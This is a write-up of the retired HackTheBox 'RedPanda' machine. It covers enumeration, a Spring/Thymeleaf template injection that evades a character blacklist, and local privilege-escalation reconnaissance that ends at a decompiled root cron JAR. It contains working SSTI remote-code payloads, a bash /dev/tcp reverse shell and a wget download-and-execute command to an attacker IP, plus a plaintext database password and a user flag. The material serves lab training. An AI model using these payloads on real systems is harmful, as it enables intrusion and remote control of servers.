---
Category: B2R
Difficulty: Easy
Platform: HackTheBox
Retired: true
Status: 3. Complete
Tags:
  - CVE-2021-33813
  - Java
  - Maven
  - SSTI
  - Spring
  - XXE-Injection
  - evasion
  - exploit-chain
  - jdom2
  - log-poisoning
  - path-traversal
  - Linux
---
![RedPanda.png](../../zzz_res/attachments/RedPanda.png)

***TABLE OF CONTENTS:***

---

# Resolution summary

>[!summary]
>- Enumeration revealed a Java application (Spring Boot) running on port 8080 vulnerable to **Java Server Side Template Injection**
>- Insufficient input sanitization allowed to **bypass the blacklist filtering using wildcards** and obtain **remote code execution**
>- Process inspections allowed to identify a cronjob running a JAR program with root privileges, vulnerable to path traversal and XXE. Reversing and inspecting the JAR source code it was possible to discover multiple vulnerabilities. Chaining those vulnerabilities it was possible to reference custom images and exploit an XXE vulnerability, obtaining a root ssh key.

## Improved skills

- Exploit SSTI in Java application
- Bypass blacklist using wildcards
- Chain multiple vulnerabilities

## Used tools

- nmap
- gobuster
- JD-GUI
- pspy64
- exiftool

## Video

---

# Information Gathering

Scanned all TCP ports:

```
$ sudo nmap -p- 10.129.195.141 -v -oA scan/all-tcp-ports -sS
...
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Enumerated open TCP ports:

```
$ sudo nmap -sV -sC -sT 10.129.195.141 -oA scan/open-tcp-ports -p22,8080
[sudo] password for kali:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-09 16:56 EDT
Nmap scan report for 10.129.195.141
Host is up (0.13s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sat, 09 Jul 2022 20:56:25 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sat, 09 Jul 2022 20:56:25 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 09 Jul 2022 20:56:25 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=7/9%Time=62C9EB8D%P=x86_64-pc-linux-gnu%r(Get
SF:Request,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charset
SF:=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Sat,\x2009\x20Jul\x202
SF:022\x2020:56:25\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\x
SF:20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"wooden
SF:_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepen
SF:\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:et\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x20
SF:<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/cs
SF:s\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20wi
SF:th\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\x
SF:20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20class
SF:='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20ri
SF:ght'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x2
SF:0\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</d
SF:iv>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x2
SF:0\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Sat
SF:,\x2009\x20Jul\x202022\x2020:56:25\x20GMT\r\nConnection:\x20close\r\n\r
SF:\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/h
SF:tml;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\
SF:r\nDate:\x20Sat,\x2009\x20Jul\x202022\x2020:56:25\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20
SF:type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,
SF:\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x2
SF:0{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;
SF:}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height
SF::1px;background-color:#525D76;border:none;}</style></head><body><h1>HTT
SF:P\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>
SF:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.11 seconds
```


# Enumeration

## Port 8080 - HTTP

Browsed port 8080:

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3.png)

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3%201.png)

### Enumerated files, directories, and API

```
$ gobuster dir -u http://10.129.195.141:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 25 -o scan/p8080-dirs.txt
...
/search               (Status: 405) [Size: 117]
/stats                (Status: 200) [Size: 987]
/error                (Status: 500) [Size: 86]
...

```

**stats**

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3%202.png)

**stats?author=damian**

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3%203.png)

**?author=woodenk**

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3%204.png)

**export.xml?author=woodenk**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

### Java Template Injection

>[!important]
>Because the title of the page is “Made with Spring Boot” we can assume the application is written in Java

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3%205.png)

Only working PoC: `#{7*7}`

- [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)
- [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java)
- [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs)

`$` sign at the beginning can be bypassed using `*`

`*{T(java.lang.System).getenv()}`

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3%206.png)

# Exploitation

## Server Side Template Injection

[https://github.com/VikasVarshney/ssti-payload](https://github.com/VikasVarshney/ssti-payload)

```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3%207.png)

Reverse shell:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.102/10099 0>&1'
```

Downloaded and executed the reverse shell:

```java
Command ==> wget 10.10.14.102/rev.sh -O /dev/shm/rs.sh
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())}

Command ==> bash /dev/shm/rs.sh
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())}
```

```
┌──(kali㉿kali)-[~/…/HTB/B2R/RedPanda/exploit]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.102] from (UNKNOWN) [10.129.195.141] 53722
bash: cannot set terminal process group (861): Inappropriate ioctl for device
bash: no job control in this shell
woodenk@redpanda:/tmp/hsperfdata_woodenk$ id
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat ~/user.txt
cat ~/user.txt
fef3c92a4b1ae1ec0f2fda764da47892
```

### Vulnerable template

Template:

```html
...
        </button>
      </div>
    </div>
  </form>
    <div class="wrapper">
  <div th:unless="${noAuthor} == true" class="results">
    <h2 th:unless="${query} == Null" th:text="${'You searched for: '} + @{__${query}__}" class="searched"></h2>
      <h2 th:text="${'There are ' + n + ' results for your search'}"></h2>
       <div th:each="panda: ${pandas}" class="result">
         <img th:src="${panda[2]}">
        <h1 class="panda_name">Panda name:</h1><h2 th:text="${panda[0]}"></h2>
        <h1 class="panda_bio">Panda bio:</h1><h2 th:text="${panda[1]}"></h2>
	...
```

Business logic:

```java
@PostMapping("/search")
	public ModelAndView search(@RequestParam("name") String name, Model model) {
	if(name.isEmpty())
	{
		name = "Greg";
	}
        String query = filter(name);
	ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
	model.addAttribute("pandas", pandas);
	model.addAttribute("n", pandas.size());
	return new ModelAndView("search.html");
	}
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
```

# Privilege Escalation

## Local enumeration

- Enumerated credentials:
    
    ```
    woodenk@redpanda:/opt$ grep -ri woo
    cleanup.sh:/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
    cleanup.sh:/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
    Binary file panda_search/target/panda_search-0.0.1-SNAPSHOT.jar matches
    Binary file panda_search/target/classes/static/img/greg.jpg matches
    Binary file panda_search/target/classes/static/img/florida.jpg matches
    Binary file panda_search/target/classes/static/img/smooch.jpg matches
    Binary file panda_search/target/classes/static/img/crafty.jpg matches
    Binary file panda_search/target/classes/static/img/smiley.jpg matches
    Binary file panda_search/target/classes/static/img/hungy.jpg matches
    Binary file panda_search/target/classes/static/img/lazy.jpg matches
    Binary file panda_search/target/classes/com/panda_search/htb/panda_search/SqlController.class matches
    Binary file panda_search/target/classes/com/panda_search/htb/panda_search/MainController.class matches
    panda_search/target/classes/templates/index.html:    <meta author="wooden_k">
    Binary file panda_search/target/classes/templates/.stats.html.swp matches
    Binary file panda_search/target/classes/templates/.search.html.swp matches
    panda_search/target/classes/templates/stats.html:        <a href="/stats?author=woodenk"><p>woodenk</p></a>
    Binary file panda_search/target/panda_search-0.0.1-SNAPSHOT.jar.original matches
    Binary file panda_search/src/main/resources/static/img/greg.jpg matches
    Binary file panda_search/src/main/resources/static/img/florida.jpg matches
    Binary file panda_search/src/main/resources/static/img/smooch.jpg matches
    Binary file panda_search/src/main/resources/static/img/crafty.jpg matches
    Binary file panda_search/src/main/resources/static/img/smiley.jpg matches
    Binary file panda_search/src/main/resources/static/img/hungy.jpg matches
    Binary file panda_search/src/main/resources/static/img/lazy.jpg matches
    panda_search/src/main/resources/templates/index.html:    <meta author="wooden_k">
    panda_search/src/main/resources/templates/stats.html:        <a href="/stats?author=woodenk"><p>woodenk</p></a>
    panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java:               if(author.equals("woodenk") || author.equals("damian"))
    panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java:               if(author.equals("woodenk") || author.equals("damian"))
    panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
    Binary file maven/lib/jsoup-1.12.1.jar matches
    Binary file maven/lib/wagon-http-3.3.4-shaded.jar matches
    ```
    
- Enumerated open ports:
    
    ```
    woodenk@redpanda:~$ netstat -polentau
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
    tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      113        22908      -                    off (0.00/0/0)
    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      113        22912      -                    off (0.00/0/0)
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        22335      -                    off (0.00/0/0)
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          22661      -                    off (0.00/0/0)
    tcp        0      0 127.0.0.1:3306          127.0.0.1:44148         ESTABLISHED 113        551270     -                    keepalive (6648.61/0/0)
    tcp        0      1 10.129.195.141:33376    1.1.1.1:53              SYN_SENT    101        552734     -                    on (3.20/2/0)
    tcp        0      0 127.0.0.1:3306          127.0.0.1:44140         ESTABLISHED 113        551228     -                    keepalive (6631.48/0/0)
    tcp        0    314 10.129.195.141:53722    10.10.14.102:10099      ESTABLISHED 1000       551271     59120/bash           on (0.32/0/0)
    tcp6       0      0 :::8080                 :::*                    LISTEN      1000       22995      872/java             off (0.00/0/0)
    tcp6       0      0 :::22                   :::*                    LISTEN      0          22663      -                    off (0.00/0/0)
    tcp6       0      0 127.0.0.1:44140         127.0.0.1:3306          ESTABLISHED 1000       551227     872/java             keepalive (6631.48/0/0)
    tcp6       0      0 10.129.195.141:8080     10.10.14.102:44992      ESTABLISHED 1000       551067     872/java             off (0.00/0/0)
    tcp6       0      0 127.0.0.1:44148         127.0.0.1:3306          ESTABLISHED 1000       551269     872/java             keepalive (6648.61/0/0)
    udp        0      0 127.0.0.1:34157         127.0.0.53:53           ESTABLISHED 102        552732     -                    off (0.00/0/0)
    udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        22334      -                    off (0.00/0/0)
    udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          21006      -                    off (0.00/0/0)
    ```
    
- Enumerated user and root processes:
    
    ```
    woodenk@redpanda:~$ ps -aux | grep -v 'root'
    USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    systemd+     635  0.0  0.3  90872  6100 ?        Ssl  Jul07   0:20 /lib/systemd/systemd-timesyncd
    message+     680  0.0  0.2   7388  4204 ?        Ss   Jul07   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
    syslog       707  0.0  0.2 224344  4220 ?        Ssl  Jul07   0:01 /usr/sbin/rsyslogd -n -iNONE
    systemd+     813  0.0  0.6  24696 13176 ?        Ss   Jul07   0:34 /lib/systemd/systemd-resolved
    daemon       863  0.0  0.1   3792  2108 ?        Ss   Jul07   0:00 /usr/sbin/atd -f
    woodenk      872  0.6 28.3 3125988 575168 ?      Sl   Jul07  24:47 java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
    mysql        897  0.2 21.5 1814972 438364 ?      Ssl  Jul07   9:37 /usr/sbin/mysqld
    woodenk    59118  0.0  0.1   6892  3368 ?        S    08:43   0:00 bash /dev/shm/rs.sh
    woodenk    59119  0.0  0.1   6892  3396 ?        S    08:43   0:00 /bin/bash -c bash -i >& /dev/tcp/10.10.14.102/10099 0>&1
    woodenk    59120  0.0  0.2   8308  5140 ?        S    08:43   0:00 bash -i
    woodenk    59231  0.0  0.4  15740  9712 ?        S    08:49   0:00 python3 -c import pty;pty.spawn("/bin/bash")
    woodenk    59232  0.0  0.2   8300  5400 pts/0    Ss   08:49   0:00 /bin/bash
    woodenk    59325  0.0  0.1   9080  3568 pts/0    R+   08:53   0:00 ps -aux
    
    woodenk@redpanda:~$ ps -aux | grep 'root' | grep -v '\['
    root           1  0.0  0.5 102272 11280 ?        Ss   Jul07   0:11 /sbin/init maybe-ubiquity
    root         461  0.0  1.9  68488 40064 ?        S<s  Jul07   0:10 /lib/systemd/systemd-journald
    root         489  0.0  0.2  22600  6044 ?        Ss   Jul07   0:01 /lib/systemd/systemd-udevd
    root         612  0.0  0.8 214596 17944 ?        SLsl Jul07   0:29 /sbin/multipathd -d -s
    root         642  0.0  0.5  47540 10676 ?        Ss   Jul07   0:00 /usr/bin/VGAuthService
    root         654  0.1  0.4 311524  8484 ?        Ssl  Jul07   4:55 /usr/bin/vmtoolsd
    root         667  0.0  0.2  99896  5996 ?        Ssl  Jul07   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
    root         679  0.0  0.4 239292  9124 ?        Ssl  Jul07   0:06 /usr/lib/accountsservice/accounts-daemon
    root         701  0.0  0.1  81956  3772 ?        Ssl  Jul07   0:11 /usr/sbin/irqbalance --foreground
    root         703  0.0  0.4 236436  9084 ?        Ssl  Jul07   0:00 /usr/lib/policykit-1/polkitd --no-debug
    root         714  0.0  0.2  17124  5780 ?        Ss   Jul07   0:00 /lib/systemd/systemd-logind
    root         724  0.0  0.6 395484 13752 ?        Ssl  Jul07   0:01 /usr/lib/udisks2/udisksd
    root         748  0.0  0.6 318816 13532 ?        Ssl  Jul07   0:00 /usr/sbin/ModemManager
    root         857  0.0  0.1   6812  2756 ?        Ss   Jul07   0:01 /usr/sbin/cron -f
    root         858  0.0  0.1   8356  3076 ?        S    Jul07   0:00 /usr/sbin/CRON -f
    root         861  0.0  0.0   2608   528 ?        Ss   Jul07   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
    root         862  0.0  0.2   9416  4240 ?        S    Jul07   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
    root         882  0.0  0.0   5828  1680 tty1     Ss+  Jul07   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
    
    $ ./pspy64
    ...
    2022/07/10 09:22:01 CMD: UID=0    PID=60086  | /usr/sbin/CRON -f
    2022/07/10 09:22:01 CMD: UID=0    PID=60087  | /bin/sh -c /root/run_credits.sh
    2022/07/10 09:22:01 CMD: UID=0    PID=60088  | /bin/sh /root/run_credits.sh
    2022/07/10 09:22:01 CMD: UID=0    PID=60089  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
    2022/07/10 09:24:01 CMD: UID=0    PID=60111  | /bin/sh -c /root/run_credits.sh
    ```
    
- Enumerated files and directories owned by the ‘log’ group:
    
    ```
    woodenk@redpanda:~$ find / -gid 1001 2>/dev/null | grep -vE 'm2|proc'
    /opt/panda_search/redpanda.log
    /tmp/tomcat.8080.10244111055566652358
    /tmp/tomcat.8080.10244111055566652358/work
    /tmp/tomcat.8080.10244111055566652358/work/Tomcat
    /tmp/tomcat.8080.10244111055566652358/work/Tomcat/localhost
    /tmp/tomcat.8080.10244111055566652358/work/Tomcat/localhost/ROOT
    /tmp/hsperfdata_woodenk
    /tmp/hsperfdata_woodenk/872
    	/tmp/tomcat-docbase.8080.14628101244872809758
    /dev/shm/rs.sh
    /credits
    /credits/damian_creds.xml
    /credits/woodenk_creds.xml
    /home/woodenk/.ssh
    /home/woodenk/.ssh/authorized_keys
    
    woodenk@redpanda:/dev/shm/expl$ ls -ald /credits/
    drw-r-x--- 2 root logs 4096 Jun 21 12:32 /credits/
    woodenk@redpanda:/dev/shm/expl$ ls -al /credits/
    total 16
    drw-r-x---  2 root logs 4096 Jun 21 12:32 .
    drwxr-xr-x 20 root root 4096 Jun 23 14:52 ..
    -rw-r-----  1 root logs  422 Jul  9 21:24 damian_creds.xml
    -rw-r-----  1 root logs  426 Jul 10 09:54 woodenk_creds.xml
    ```
    
- Log example generated using the “Export table” function from the web app:
    
    ```
    200||10.10.14.102||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36||/stats
    200||10.10.14.102||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36||/stats
    200||10.10.14.102||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36||/stats
    200||10.10.14.102||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36||/export.xml
    ```
    
- Decompiled final-1.0-jar-with-dependencies.jar:
    
    ```java
    package com.logparser;
    
    import com.drew.imaging.jpeg.JpegMetadataReader;
    import com.drew.imaging.jpeg.JpegProcessingException;
    import com.drew.metadata.Directory;
    import com.drew.metadata.Metadata;
    import com.drew.metadata.Tag;
    import java.io.BufferedWriter;
    import java.io.File;
    import java.io.FileWriter;
    import java.io.IOException;
    import java.util.HashMap;
    import java.util.Map;
    import java.util.Scanner;
    import org.jdom2.Document;
    import org.jdom2.Element;
    import org.jdom2.JDOMException;
    import org.jdom2.input.SAXBuilder;
    import org.jdom2.output.Format;
    import org.jdom2.output.XMLOutputter;
    
    public class App {
      public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map<Object, Object> map = new HashMap<>();
        map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        return map;
      }
      
      public static boolean isImage(String filename) {
        if (filename.contains(".jpg"))
          return true; 
        return false;
      }
      
      public static String getArtist(String uri) throws IOException, JpegProcessingException {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for (Directory dir : metadata.getDirectories()) {
          for (Tag tag : dir.getTags()) {
            if (tag.getTagName() == "Artist")
              return tag.getDescription(); 
          } 
        } 
        return "N/A";
      }
      
      public static void addViewTo(String path, String uri) throws JDOMException, IOException {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());
        File fd = new File(path);
        Document doc = saxBuilder.build(fd);
        Element rootElement = doc.getRootElement();
        for (Element el : rootElement.getChildren()) {
          if (el.getName() == "image")
            if (el.getChild("uri").getText().equals(uri)) {
              Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);
              System.out.println("Total views:" + Integer.toString(totalviews.intValue()));
              rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));
              Integer views = Integer.valueOf(Integer.parseInt(el.getChild("views").getText()));
              el.getChild("views").setText(Integer.toString(views.intValue() + 1));
            }  
        } 
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
      }
      
      public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while (log_reader.hasNextLine()) {
          String line = log_reader.nextLine();
          if (!isImage(line))
            continue; 
          Map parsed_data = parseLog(line);
          System.out.println(parsed_data.get("uri"));
          String artist = getArtist(parsed_data.get("uri").toString());
          System.out.println("Artist: " + artist);
          String xmlPath = "/credits/" + artist + "_creds.xml";
          addViewTo(xmlPath, parsed_data.get("uri").toString());
        } 
      }
    }
    ```
    
